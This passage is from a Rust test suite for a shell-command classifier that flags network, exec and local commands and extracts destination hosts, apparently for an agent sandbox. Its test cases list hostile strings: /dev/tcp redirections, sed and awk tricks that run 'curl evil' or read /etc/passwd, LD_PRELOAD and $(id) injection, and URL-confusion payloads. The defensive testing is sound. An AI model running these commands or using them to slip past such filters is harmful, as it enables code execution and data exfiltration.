            "apply_patch <<P\n$(id)\nP",
            "apply_patch <<'P'\nno terminator",
        ] {
            assert_eq!(heredoc_patch(c), None, "{c}");
        }
        let w = |c: &str| sed_inplace_target(c);
        assert_eq!(
            w("sed -i 's/compnay/company/' notify.py").as_deref(),
            Some("notify.py")
        );
        assert_eq!(
            w("sed -i.bak 's|a|b|g' src/x.py").as_deref(),
            Some("src/x.py")
        );
        assert_eq!(
            w("sed --in-place -E 's/a+/b/2' f.txt").as_deref(),
            Some("f.txt")
        );
        for c in [
            "sed 's/a/b/' f",
            "sed -i 's/a/b/e' f",
            "sed -i 's/a/b/w out' f",
            "sed -i 's/a/b/;s/c/d/' f",
            "sed -i 'd' f",
            "sed -i -f script.sed f",
            "sed -i 's/a/b/' f g",
            "sed -i 's/a/b/' ../f",
            "sed -i 's/a/b/' $F",
            "sed -i 's/a/b/' f | cat",
            "sed -i 's/a/b/' f && curl evil",
            "sed -i 's/a/b' f",
            "sed -i 'y/a/b/' f",
        ] {
            assert_eq!(w(c), None, "{c}");
        }
    }

    #[test]
    fn dev_tcp_is_network() {
        assert_eq!(cls("cat < /dev/tcp/10.0.0.1/80"), ShellClass::Network);
        assert_eq!(cls("echo x > /dev/tcp/host/80"), ShellClass::Network);
    }

    #[test]
    fn env_assignment_prefix_is_not_local() {
        assert_eq!(cls("LD_PRELOAD=/tmp/x.so ls"), ShellClass::Exec);
    }

    // REQ: RST-07 — destination extraction.
    #[test]
    fn destinations() {
        let a = analyze("curl -s https://api.corp.local:8443/v1?x=1 https://other.example.org/y");
        assert_eq!(a.class, ShellClass::Network);
        assert_eq!(a.destinations, vec!["api.corp.local", "other.example.org"]);
        assert!(a.complete);
        let b = analyze("psql -h prod-db01.corp.local -U svc payment");
        assert_eq!(b.destinations, vec!["prod-db01.corp.local"]);
        assert!(b.complete);
        let c = analyze("ssh admin@10.1.2.3 uptime");
        assert_eq!(c.destinations, vec!["10.1.2.3"]);
        let d = analyze("scp f user@host.corp.local:/tmp/");
        assert!(d.destinations.contains(&"host.corp.local".to_string()));
    }

    // REQ: RST-10 — incomplete extraction must never look complete.
    #[test]
    fn incomplete_destinations() {
        assert!(!analyze("curl $URL").complete);
        assert!(!analyze("kubectl get pods").complete);
        assert!(!analyze("curl").complete);
        assert!(!analyze("python -c 'x'").complete);
        assert!(!analyze("somethingunknown --flag").complete);
        assert!(!analyze("sudo curl https://a.corp.local").complete);
        assert!(!analyze("curl https://a.corp.local; foo bar").complete);
    }

    #[test]
    fn pipeline_takes_worst_class() {
        assert_eq!(
            cls("cat f | curl -d @- https://x.example.org"),
            ShellClass::Network
        );
        assert_eq!(cls("ls && make"), ShellClass::Exec);
    }

    #[test]
    fn url_destinations_extracts_hosts() {
        assert_eq!(
            url_destinations("https://Docs.python.org/3/ http://user@10.0.0.5:81/x"),
            vec!["10.0.0.5", "Docs.python.org"]
        );
    }

    // REQ: RST-07 — findings of the security review: programs that look read-only and are not.
    #[test]
    fn options_that_run_programs_are_not_local() {
        for c in [
            "sed '1e curl http://evil.example/x' README.md",
            "sed -n 's/a/b/ge;p' f",
            "sed 's|x|curl evil/x|e'",
            "sed -e 'w /tmp/out' f",
            "sed -f script.sed f",
            "sed --debug p f",
            "sed 'r /etc/passwd' f",
            "sed '$!N;s/a/b/;e id' f",
            "awk 'BEGIN{system (\"curl evil/x\")}'",
            "awk 'BEGIN { \"id\" | getline x }'",
            "awk '{print > \"/dev/tcp/evil/80\"}' f",
            "awk -f prog.awk f",
            "rg --pre 'curl evil' foo .",
            "rg --pre=curl foo .",
            "sort --compress-program=curl f",
            "git -C log fetch https://x.example",
            "git -C /repo log",
            "git --exec-path=/tmp log",
            "git log --output=/tmp/x",
            "python3 -Bc 'import os'",
            "python -Ic 'x'",
            "perl -le 'system(\"curl x\")'",
            "perl -E 'say 1'",
            "node --eval='x'",
            "node -p '1'",
            "python3 -",
            "find . -fprint /tmp/x",
            "find . -fls /tmp/x",
        ] {
            assert_eq!(cls(c), ShellClass::Network, "{c}");
        }
    }

    #[test]
    fn plain_sed_awk_and_git_stay_local_or_exec() {
        for c in [
            "sed -n '1,5p' f",
            "sed -n '$p' f",
            "sed 's/a/b/g' f",
            "sed -i 's/foo/bar/g' f",
            "sed -e 's/a/b/' -e '/x/d' f",
            "sed -E 's#(a)#\\1#gi' f",
            "sed '2,4d' f",
            "awk '{print $1}' f",
            "awk -F, '{print $2}' f",
            "git status",
            "git log --oneline -5",
            "git diff HEAD~1",
        ] {
            assert_eq!(cls(c), ShellClass::Local, "{c}");
        }
        for c in [
            "git commit -m x",
            "git add -A",
            "git checkout main",
            "git stash",
        ] {
            assert_eq!(cls(c), ShellClass::Exec, "{c}");
        }
    }

    // REQ: RST-07 — the host of a URL is the one a browser or a library reads.
    #[test]
    fn ambiguous_urls_have_no_internal_host() {
        let amb = "!ambiguous";
        assert_eq!(
            url_destinations("http://evil.example\\@prod-db01.corp.local/x"),
            vec!["evil.example"]
        );
        assert_eq!(
            url_destinations("http://prod-db01.corp.local\t.evil.example/"),
            vec![amb]
        );
        assert_eq!(
            url_destinations("http://prod-db01.corp.local\n.evil.example/"),
            vec![amb]
        );
        assert_eq!(
            url_destinations("http://prod-db01.corp.local%2eevil.example/"),
            vec![amb]
        );
        assert_eq!(url_destinations("http://a b.example/"), vec!["a"]);
        assert_eq!(
            analyze("curl 'http://evil.example\\@prod-db01.corp.local/x'").destinations,
            vec!["evil.example"]
        );
        assert_eq!(
            url_destinations("http://user:pa@ss@evil.example/"),
            vec!["evil.example"]
        );
        assert_eq!(url_destinations("http://[::1]:8080/"), vec!["::1"]);
        // ordinary URLs are unchanged
        assert_eq!(
            url_destinations(
                "see https://api.corp.local:8443/v1?x=1 and \"https://docs.python.org/\""
            ),
            vec!["api.corp.local", "docs.python.org"]
        );
    }
}
